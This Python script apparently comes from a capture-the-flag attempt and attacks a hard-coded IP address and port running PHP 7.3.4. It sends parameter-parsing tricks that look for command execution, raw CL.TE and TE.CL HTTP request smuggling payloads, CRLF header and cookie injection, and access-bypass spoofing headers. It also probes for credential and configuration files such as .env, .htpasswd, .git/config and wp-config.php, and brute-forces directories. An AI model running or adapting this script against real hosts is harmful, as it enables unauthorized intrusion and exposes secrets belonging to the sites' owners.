#!/usr/bin/env python3
"""
PHP 7.3.4 - Testing various attack vectors
Including HTTP Request Smuggling and PHP-specific tricks
"""
import requests
import socket
import re

target_host = "61.147.171.35"
target_port = 51810
target_url = f"http://{target_host}:{target_port}"

def test_php_parse_tricks():
    """
    PHP has special behavior with certain parameter names:
    - Dots and spaces in parameter names are converted to underscores
    - Parameters like a.b become a_b
    """
    # Some CTF challenges use this trick
    tricky_params = [
        # PHP will treat these specially
        ("a.b", "id"),
        ("a b", "id"),
        ("a%20b", "id"),
        ("a%00b", "id"),  # null byte
        ("[test]", "id"),
        ("a[]", "id"),
        ("a[0]", "id"),
        # Double encoding
        ("%63%6d%64", "id"),  # cmd
        # Unicode tricks
        ("c\u006dd", "id"),  # cmd with unicode
    ]
    
    print("Testing PHP parameter parsing tricks...")
    for param, value in tricky_params:
        url = f"{target_url}/?{param}={value}"
        try:
            r = requests.get(url, timeout=3)
            if "uid=" in r.text or "www-data" in r.text:
                print(f"[+] FOUND: {param}={value}")
                print(f"    Response: {r.text[:100]}")
        except Exception as e:
            pass

def test_http_smuggling():
    """Test HTTP request smuggling via CL.TE or TE.CL"""
    print("\nTesting HTTP Request Smuggling...")
    
    # CL.TE smuggling
    smuggle_payloads = [
        # CL.TE
        b"POST / HTTP/1.1\r\n"
        b"Host: 61.147.171.35:51810\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"G",
        
        # TE.CL
        b"POST / HTTP/1.1\r\n"
        b"Host: 61.147.171.35:51810\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 3\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"8\r\n"
        b"SMUGGLED\r\n"
        b"0\r\n"
        b"\r\n",
    ]
    
    for i, payload in enumerate(smuggle_payloads):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_host, target_port))
            sock.send(payload)
            response = sock.recv(4096)
            sock.close()
            print(f"[Smuggle {i}] Response: {response[:150]}")
        except Exception as e:
            print(f"[Smuggle {i}] Error: {e}")

def test_crlf_injection():
    """Test CRLF injection in headers"""
    print("\nTesting CRLF Injection...")
    
    # CRLF injection attempts
    crlf_payloads = [
        "/%0d%0aX-Injected-Header:test",
        "/?test=%0d%0aSet-Cookie:admin=true",
        "/%0aX-Test:injected",
        "/?%0d%0a%0d%0a<html>injected</html>",
    ]
    
    for payload in crlf_payloads:
        url = f"{target_url}{payload}"
        try:
            r = requests.get(url, timeout=3, allow_redirects=False)
            # Check for injected headers
            if "X-Injected" in str(r.headers) or "X-Test" in str(r.headers):
                print(f"[+] CRLF found: {payload}")
            if "Set-Cookie" in str(r.headers) and "admin" in str(r.headers.get('Set-Cookie', '')):
                print(f"[+] Cookie injection: {payload}")
        except:
            pass

def test_ssrf_headers():
    """Test SSRF via various headers"""
    print("\nTesting SSRF via headers...")
    
    # Headers that might trigger SSRF
    ssrf_headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "127.0.0.1",
        "X-Forwarded-Host": "127.0.0.1",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "True-Client-IP": "127.0.0.1",
        "Cluster-Client-IP": "127.0.0.1",
        "Client-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1",
        "Forwarded-For": "127.0.0.1",
        "X-ProxyUser-Ip": "127.0.0.1",
    }
    
    # Test each header
    for header, value in ssrf_headers.items():
        try:
            r = requests.get(target_url, headers={header: value}, timeout=3)
            if r.text != "Hello World!\n":
                print(f"[+] Different response with {header}: {r.text[:50]}")
        except:
            pass

def test_special_files():
    """Test for special PHP files"""
    print("\nTesting special PHP files...")
    
    files = [
        ".htaccess", ".htpasswd", ".git/config", ".svn/entries",
        "config.php", "config.inc.php", "db.php", "database.php",
        "conn.php", "connection.php", "settings.php", "config.inc",
        "wp-config.php", "configuration.php", "LocalSettings.php",
        "parameters.yml", ".env", "web.config", "app.config",
        "composer.json", "package.json", "Gemfile",
        # Common sensitive files
        "flag", "flag.txt", "flag.php", "f1ag.php", "f14g.php",
        "fl4g.txt", "getflag", ".flag", "secret", "secret.txt",
        # Backup files
        "index.php~", "index.php.bak", "index.php.old", "index.php.swp",
        ".index.php.swp", "index.php.save", "index.php.orig",
        "index.bak", "index.old", "backup.zip", "backup.tar.gz",
        # Source code leaks
        "index.phps", "index.php.txt", "index.php.inc",
        # Log files
        "error.log", "access.log", "debug.log",
    ]
    
    for f in files:
        url = f"{target_url}/{f}"
        try:
            r = requests.get(url, timeout=2)
            if r.status_code == 200 and r.text and "Not Found" not in r.text and r.text != "Hello World!\n":
                print(f"[+] Found {f}: {r.text[:100]}")
        except:
            pass

def test_php_info_disclosure():
    """Test for PHP info disclosure"""
    print("\nTesting PHP info disclosure...")
    
    # Common phpinfo paths
    info_paths = [
        "phpinfo.php", "info.php", "test.php", "i.php", "pi.php",
        "php.php", "p.php", "php_info.php", "infophp.php",
        "pinfo.php", "test/phpinfo.php", "admin/phpinfo.php",
        # Parameter-based
        "?phpinfo", "?phpinfo=1", "?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
        "?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",  # PHP egg
    ]
    
    for path in info_paths:
        url = f"{target_url}/{path}"
        try:
            r = requests.get(url, timeout=2)
            if "<title>phpinfo()</title>" in r.text or "PHP Version" in r.text:
                print(f"[+] PHPInfo found at: {path}")
        except:
            pass

def brute_force_dirs():
    """Brute force common directories"""
    print("\nBrute forcing directories...")
    
    dirs = [
        "admin", "administrator", "login", "user", "users", "member",
        "api", "v1", "v2", "data", "upload", "uploads", "images", "img",
        "files", "download", "downloads", "backup", "backups", "temp",
        "tmp", "cache", "log", "logs", "debug", "test", "tests",
        "dev", "development", "staging", "production", "prod",
        "internal", "private", "secret", "hidden", "old", "new",
        "config", "conf", "cfg", "inc", "include", "includes",
        "lib", "libs", "library", "class", "classes", "src", "source",
        "assets", "static", "public", "web", "www", "html",
        "cgi", "cgi-bin", "bin", "scripts", "js", "css",
        "flag", "fl4g", "f1ag", "ctf", "challenge",
    ]
    
    for d in dirs:
        url = f"{target_url}/{d}/"
        try:
            r = requests.get(url, timeout=2, allow_redirects=False)
            if r.status_code not in [404, 500]:
                print(f"[{r.status_code}] /{d}/")
        except:
            pass

if __name__ == "__main__":
    test_php_parse_tricks()
    test_http_smuggling()
    test_crlf_injection()
    test_ssrf_headers()
    test_special_files()
    test_php_info_disclosure()
    brute_force_dirs()
